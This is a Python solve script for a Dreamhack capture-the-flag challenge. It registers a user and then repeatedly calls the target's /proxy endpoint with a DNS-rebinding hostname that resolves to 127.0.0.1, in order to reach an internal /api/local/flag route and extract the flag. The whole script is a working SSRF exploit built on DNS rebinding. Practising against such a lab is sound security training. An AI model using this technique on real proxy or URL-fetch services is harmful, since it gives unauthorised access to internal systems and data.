import requests
import re

sess = requests.Session()

URL = "http://host3.dreamhack.games:13370"

user_id = 'test_user'
user_pw = 'test_pass'

# Register User
requests.post(f"{URL}/auth", data={
    "id": user_id,
    "pw": user_pw,
    "register": "Register"
})

# Login
sess.post(f"{URL}/auth", data={
    "id": user_id,
    "pw": user_pw,
    "login": "Login"
})

scheme = 'http'
host = '6814179a.7f000001.rbndr.us'
port = '8080'


for i in range(100):
    path = f"/api/local/flag#{i}"
    res = sess.get(f"{URL}/proxy", params = {
        "scheme": scheme,
        "host": host,
        "path": path,
        "port": port
    })

    print("Proxy status:", res.status_code)

    if res.status_code == 200:
        try:
            print(re.search(r'DH\{[^>]*\}', res.text).group(0))
            break
        except Exception:
            continue
